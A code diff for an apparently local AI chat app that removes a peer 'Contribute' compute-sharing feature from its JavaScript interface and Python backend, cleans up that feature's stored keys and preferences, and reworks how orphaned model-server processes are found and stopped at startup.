         if(!IS_LOCAL)mu.hidden=true;}}
-// ONE-TIME invitation, and never during the show: it waits for the
-// rainbow wipe to LAND (body.painted, wipeBusy clear) so the card never
-// crowds the boot flourish. Marked seen the moment it appears, so it is
-// genuinely once — answered or not.
-(async function shareInvite(){
-  if(!IS_LOCAL)return;
-  try{
-    const pr=await(await fetch("/api/prefs")).json();
-    if(pr.seen_share||pr.contrib_on){
-      const row=$("#share-row");if(row)row.hidden=true;
-      return;
-    }
-    const st=await(await fetch("/api/setup")).json();
-    if(st.needs_setup||st.busy)return;      // let them finish setting up
-    const t0=Date.now();
-    const wait=setInterval(()=>{
-      const settled=document.body.classList.contains("painted")&&!wipeBusy;
-      if(!settled&&Date.now()-t0<20000)return;   // 20s failsafe
-      clearInterval(wait);
-      setTimeout(()=>{
-        if(!veil.hidden||!aboutVeil.hidden)return;   // never stack modals
-        $("#share-veil").hidden=false;
-        fetch("/api/prefs",{method:"POST",
-          headers:{"Content-Type":"application/json"},
-          body:JSON.stringify({seen_share:true})});
-      },900);
-    },400);
-  }catch(e){}
-})();
-function shareDone(on){
-  $("#share-veil").hidden=true;
-  const cb=$("#contrib");if(cb&&on)cb.checked=true;
-  if(on)fetch("/api/prefs",{method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({contrib_on:true})});
-}
 // THE PROVIDER BOARD (6b218, per Patrick): fixed rows —
 // Gemini / Groq / Claude / Kimi K3 — grey until a key is saved, green ✓
 // when its key works, red ✗ with the reason when it doesn't. The rows
@@ -22967,8 +22712,6 @@ $("#ck-save").addEventListener("click",async()=>{
 if(!IS_LOCAL){const b=$("#cloudkey-box");if(b)b.hidden=true;}
 $("#dlhelp-ok").addEventListener("click",()=>{
   $("#dlhelp-veil").hidden=true;});
-$("#share-no").addEventListener("click",()=>shareDone(false));
-$("#share-yes").addEventListener("click",()=>shareDone(true));
 // WEB ONLY: a browser visitor is borrowing someone else's GPU — offer
 // them the real app for their own platform
 (async()=>{
@@ -23324,31 +23067,11 @@ async function openAbout(){
     // (chip / memory / accel), so the fix is deletion — the 6b245
     // lesson — and the id is retired (distinct new-title / up-title).
     try{
-      const fs=await(await fetch("/api/fleet/status")).json();
-      if(fs.key!==undefined){
-        $("#fleet-pending").innerHTML=(fs.pending||[]).map(p=>
-          '<div class="preq">\u26a1 '+esc(p.name)
-          +' wants to contribute<button data-id="'+esc(p.id)
-          +'">Approve</button></div>').join("");
-        $("#fleet-pending").querySelectorAll("button").forEach(b=>
-          b.addEventListener("click",async()=>{
-            await fetch("/api/fleet/approve",{method:"POST",
-              headers:{"Content-Type":"application/json"},
-              body:JSON.stringify({id:b.dataset.id})});
-            b.closest(".preq").remove();
-          }));
-      }
-    }catch(e){}
-    try{
       const pr2=await(await fetch("/api/prefs")).json();
-      const mine=await(await fetch("/api/fleet/mine")).json();
       $("#turbo").checked=!!pr2.turbo;
-      $("#contrib").checked=!!pr2.contrib_on;
       if($("#upchan"))$("#upchan").value=pr2.update_channel||(pr2.beta_updates?"beta":"stable");
       $("#autochk-toggle").classList.toggle("on",pr2.auto_update_check!==false);
       $("#autoclean-toggle").classList.toggle("on",pr2.auto_cleanup!==false);   // on by default (6b306)
-      // unchecked features fold their furniture away (6.0b5)
-      $("#fleet-box").hidden=!pr2.contrib_on;
       try{
         const cs=await(await fetch("/api/cloud")).json();
         $("#turbo-row").hidden=!cs.configured;
@@ -23366,21 +23089,6 @@ async function openAbout(){
           "Answers come from "+cs.name+" instead of this Mac \u2014 much "
           +"faster, but your prompts leave this computer while it is on.";
       }catch(e){}
-      // THE TRUTHFUL LEDGER (6b257): numbers this Mac measured itself.
-      // The old contributing-to-N-users line read the LOCAL machine's
-      // user count (nearly always 1) and had lied politely since the
-      // day it shipped — the gauntlet now forbids its return.
-      $("#acon").checked=pr2.contrib_ac_only!==false;
-      $("#idleon").checked=pr2.contrib_idle_only!==false;
-      const _cpct=+pr2.contrib_max_pct||50;
-      $$("#contrib-seg .cseg").forEach(s=>
-        s.classList.toggle("on",+s.dataset.pct===_cpct));
-      const led=(mine&&mine.ledger)||{};
-      $("#cs-jobs").textContent=led.jobs||0;
-      $("#cs-time").textContent=fmtDur(led.seconds||0);
-      $("#cs-chars").textContent="~"+fmtChars(led.chars||0);
-      $("#contrib-state").textContent=
-        pr2.contrib_on?(mine.state||""):"";
     }catch(e){}
     const ready=st.models.filter(x=>x.status==="ready").length;
     $("#about-facts").textContent=ready+" / "+st.models.length;
@@ -23496,35 +23204,6 @@ lenSlider.addEventListener("change",()=>{
   fetch("/api/prefs",{method:"POST",
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({length:+lenSlider.value})});
-});
-
-/* -------------------------------------- Community controls (6b257) */
-function fmtDur(s){
-  if(s<60)return Math.round(s)+"s";
-  if(s<5400)return Math.round(s/60)+"m";
-  return Math.round(s/360)/10+"h";
-}
-function fmtChars(c){
-  if(c<1000)return c+"";
-  if(c<1e6)return Math.round(c/1000)+"k";
-  return Math.round(c/1e5)/10+"M";
-}
-$("#contrib-seg").addEventListener("click",e=>{
-  const s=e.target.closest(".cseg");if(!s)return;
-  $$("#contrib-seg .cseg").forEach(x=>x.classList.toggle("on",x===s));
-  fetch("/api/prefs",{method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({contrib_max_pct:+s.dataset.pct})});
-});
-$("#acon").addEventListener("change",()=>{
-  fetch("/api/prefs",{method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({contrib_ac_only:$("#acon").checked})});
-});
-$("#idleon").addEventListener("change",()=>{
-  fetch("/api/prefs",{method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({contrib_idle_only:$("#idleon").checked})});
 });
 
 /* ------------------------------------------ the Models roster (6b257,
@@ -24073,7 +23752,7 @@ $("#roster").addEventListener("click",async e=>{
       headers:{"Content-Type":"application/json"},
       body:JSON.stringify({labels:[i.dataset.l]})});
     i.textContent="downloading";
-    $("#manage-note").textContent=esc(i.dataset.l)+" \u2014 starting\u2026";
+    $("#manage-note").textContent=i.dataset.l+" \u2014 starting\u2026";
     manageTick();
   }catch(e2){i.textContent="failed";}
 });
@@ -24254,14 +23933,6 @@ $("#upchan").addEventListener("change",async()=>{
   // immediately so a waiting build shows the UPDATE flag right away
   $("#about-check").click();
 });
-$("#contrib").addEventListener("change",async()=>{
-  const on=$("#contrib").checked;
-  $("#fleet-box").hidden=!on;
-  $("#contrib-state").textContent=on?"connecting\u2026":"";
-  await fetch("/api/prefs",{method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({contrib_on:on})});
-});
 $("#about-close").addEventListener("click",()=>{aboutVeil.hidden=true;});
 aboutVeil.addEventListener("click",e=>{if(e.target===aboutVeil)aboutVeil.hidden=true;});
 $("#about-check").addEventListener("click",async ev=>{
@@ -24401,9 +24072,8 @@ async function zBuild(){
   const eng=await gj("/api/engines");
   const lat=Math.round(performance.now()-t0);
   const r=await Promise.all([gj("/api/cloud"),gj("/api/stats"),
-    gj("/api/memory"),gj("/api/sky/cached"),gj("/api/fleet/status"),
-    gj("/api/workspace")]);
-  const cl=r[0],st=r[1],mm=r[2],sky=r[3],fl=r[4],ws=r[5];
+    gj("/api/memory"),gj("/api/sky/cached"),gj("/api/workspace")]);
+  const cl=r[0],st=r[1],mm=r[2],sky=r[3],ws=r[4];
 
   const names=Object.keys(eng||{});
   const up=names.filter(k=>eng[k]&&eng[k].up);
@@ -24421,7 +24091,6 @@ async function zBuild(){
     .find(id=>keys.indexOf(id)>=0)]:"GEMMA \u00b7 local";
   const facts=((mm||{}).facts||[]).length;
   const clips=((sky||{}).cached||[]).length;
-  const peers=((fl||{}).workers||[]).length;
   const root=((ws||{}).root||"").split("/").filter(Boolean).pop()||"none";
 
   /* ticker — every cell but the last one is measured */
@@ -24446,7 +24115,6 @@ async function zBuild(){
     ["compositor",ladder.toLowerCase(),"--n5"],
     ["memory",facts+" fact"+(facts===1?"":"s"),"--n7"],
     ["workspace",root,"--n8"],
-    ["fleet",peers+" peer"+(peers===1?"":"s"),"--n1"],
     ["pantry",clips+" clip"+(clips===1?"":"s"),"--zb"],
     ["telemetry","live","--n3"],
     ["guardrail","armed","--n5"],
@@ -25134,7 +24802,7 @@ def maybe_version_splash():
     try:
         # dev and test instances share this prefs file with the real
         # app: they may show the moment but never move the record
-        real = not os.environ.get("MILLENAI_TESTBUILD") and PORT == 8889
+        real = not os.environ.get("MILLENAI_TESTBUILD") and DEFAULT_APP
         ident = short_version()
         with _prefs_lock:
             prefs = load_prefs()
@@ -25169,28 +24837,90 @@ def reap_orphan_engines():
     coexist) have that instance as their parent and are left alone."""
     if IS_WIN:
         return
-    ports = sorted({i["port"] for i in MODEL_INFO.values() if i["port"]})
-    for port in ports:
+    # EVERY port this user listens on, not just the catalog's (6b310):
+    # an engine moved off a port another account held lives on a free
+    # one. Only an mlx_lm server counts, never this app itself (opened
+    # from Finder, the app's own parent is launchd too).
+    try:
+        out = subprocess.run(
+            ["lsof", "-nP", "-a", "-iTCP", "-sTCP:LISTEN", "-u",
+             str(os.getuid()), "-Fp"],
+            capture_output=True, text=True, timeout=5).stdout
+        pids = {ln[1:] for ln in out.splitlines() if ln.startswith("p")}
+    except Exception:
+        pids = set()
+    pids.discard(str(os.getpid()))
+    for pid in pids:
         try:
-            pids = subprocess.run(
-                ["lsof", "-ti", f"tcp:{port}", "-sTCP:LISTEN"],
-                capture_output=True, text=True, timeout=5).stdout.split()
-            for pid in pids:
-                ppid = subprocess.run(
-                    ["ps", "-o", "ppid=", "-p", pid],
-                    capture_output=True, text=True, timeout=5).stdout.strip()
-                cmd = subprocess.run(
-                    ["ps", "-o", "command=", "-p", pid],
-                    capture_output=True, text=True, timeout=5).stdout
-                if ppid == "1" and ("ython" in cmd or "mlx" in cmd):
-                    os.kill(int(pid), signal.SIGTERM)
-                    print(f"  reaped orphan engine on :{port} (pid {pid})")
+            ppid = subprocess.run(
+                ["ps", "-o", "ppid=", "-p", pid],
+                capture_output=True, text=True, timeout=5).stdout.strip()
+            cmd = subprocess.run(
+                ["ps", "-o", "command=", "-p", pid],
+                capture_output=True, text=True, timeout=5).stdout
+            if ppid == "1" and "mlx_lm" in cmd:
+                os.kill(int(pid), signal.SIGTERM)
+                print(f"  reaped orphan engine (pid {pid})")
         except Exception:
+            pass
+    # a private Ollama serve (another account held 11434) left by a crash
+    note = os.path.join(app_dir(), "run", "ollama-private")
+    try:
+        pid, _port = open(note).read().split()
+        ppid = subprocess.run(["ps", "-o", "ppid=", "-p", pid],
+                              capture_output=True, text=True,
+                              timeout=5).stdout.strip()
+        cmd = subprocess.run(["ps", "-o", "command=", "-p", pid],
+                             capture_output=True, text=True,
+                             timeout=5).stdout
+        if ppid == "1" and "ollama" in cmd:
+            os.kill(int(pid), signal.SIGTERM)
+            print(f"  reaped a private ollama serve (pid {pid})")
+    except Exception:
+        pass
+    try:
+        os.remove(note)
+    except OSError:
+        pass
+
+
+def _retire_contribute():
+    """Contribute is gone (6b310): drop its hub credentials and switches
+    from prefs, and its key, worker list and ledger files. Idempotent."""
+    try:
+        with _prefs_lock:
+            p = load_prefs(None)
+            gone = [k for k in p if k.startswith("contrib_")
+                    or k in ("fleet_auto", "seen_share")]
+            if gone:
+                for k in gone:
+                    p.pop(k, None)
+                store_prefs(p)
+    except Exception:
+        pass
+    for fn in ("fleet_key", "fleet_workers.json", "contrib_ledger.json"):
+        try:
+            os.remove(os.path.join(app_dir(), fn))
+        except OSError:
             pass
 
 
 if __name__ == "__main__":
-    threading.Thread(target=start_backend, daemon=True).start()
+    if DEFAULT_APP and not single_instance():
+        sys.exit(0)
+    if DEFAULT_APP:
+        # dev and test instances share this data folder: only the app a
+        # person opened may change what's in it on its own
+        _retire_contribute()
+    try:
+        _server = bind_backend()
+    except OSError as exc:
+        print(f"\n  {APP_NAME} can't start: no free port ({exc}).\n")
+        sys.exit(1)
+    if DEFAULT_APP:
+        _write_instance_note()
+    threading.Thread(target=start_backend, args=(_server,),
+                     daemon=True).start()
     print(f"\n  {APP_NAME} {short_version()}")
     print(f"  running on http://127.0.0.1:{PORT}")
     reap_orphan_engines()
@@ -25201,16 +24931,14 @@ if __name__ == "__main__":
         _SWEEP_DONE.set()
     threading.Thread(target=_mlx_janitor, daemon=True).start()
     threading.Thread(target=_warm_studio_cache, daemon=True).start()
-    contrib_apply()   # resume Contribute mode if it was left on
     start_managed_engines()
     if not HAS_SEARCH:
         print("  (web search disabled — pip install ddgs to enable)")
     if not HAS_PSUTIL:
         print("  (telemetry simulated — pip install psutil for real numbers)")
     print()
-    url = f"http://127.0.0.1:{PORT}"
-    if ACCESS_KEY:
-        url += "?key=" + ACCESS_KEY   # the app window authenticates itself
+    # the window collects this launch's key once; see StudioHandler._gate
+    url = f"http://127.0.0.1:{PORT}/?key=" + urllib.parse.quote(ACCESS_KEY)
 
     if HAS_WEBVIEW and IS_MAC:
         # WKWebView ships with getUserMedia dead in two separate ways, and
